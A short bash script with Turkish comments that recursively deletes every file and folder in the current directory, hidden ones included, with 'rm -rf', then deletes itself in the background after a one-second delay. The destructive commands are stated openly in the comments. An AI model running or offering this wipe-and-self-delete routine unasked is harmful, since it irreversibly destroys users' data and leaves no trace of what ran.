#!/bin/bash

# Çalışılan dizini al
TARGET_DIR="."
SCRIPT_NAME=$(basename "$0")

# 1. Kendi haricindeki tüm dosya ve klasörleri sil
for item in "$TARGET_DIR"/* "$TARGET_DIR"/.*; do
    # '.' ve '..' özel dizinlerini atla
    base_item=$(basename "$item")
    if [ "$base_item" = "." ] || [ "$base_item" = ".." ]; then
        continue
    fi

    # Kendi dosyasını atla
    if [ "$base_item" = "$SCRIPT_NAME" ]; then
        continue
    fi

    # Silme işlemi
    if [ -e "$item" ]; then
        rm -rf "$item"
    fi
done

# 2. En son kendisini silmek için arka planda 1 sn gecikmeli silme komutu tetikler
(sleep 1 && rm -f "$SCRIPT_NAME") &
